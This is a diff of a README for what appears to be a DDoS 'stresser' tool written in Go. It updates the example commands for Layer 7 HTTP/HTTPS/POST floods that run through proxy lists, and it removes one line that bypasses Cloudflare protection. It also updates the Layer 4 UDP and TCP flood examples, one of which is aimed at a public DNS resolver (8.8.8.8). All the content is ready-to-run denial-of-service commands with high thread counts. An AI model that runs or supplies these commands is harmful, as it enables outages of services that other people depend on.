@@ -13,13 +13,14 @@ go build -o stresser
 ## L7 examples:
 ```bash
 
-./stresser -m http -t https://target.com -p proxies.txt -th 600 -d 40
-./stresser -m bypass -t https://cf-protected.site -th 400
+./stresser -m https3 -t https://target.com -p proxies.txt -th 1000 -d 60
+./stresser -m post -t https://target.com -th 800
+./stresser -m https2 -t https://target.com -th 700
 
 ```
 ## L4 examples:
 ```bash
 
-./stresser -m udp -t 8.8.8.8:53 -th 800 -d 20
-./stresser -m syn -t 192.168.1.1:80 -th 500
+./stresser -m udppower -t 8.8.8.8:53 -th 1200 -d 30
+./stresser -m tcpfull -t 192.168.1.1:80 -th 900
 ```
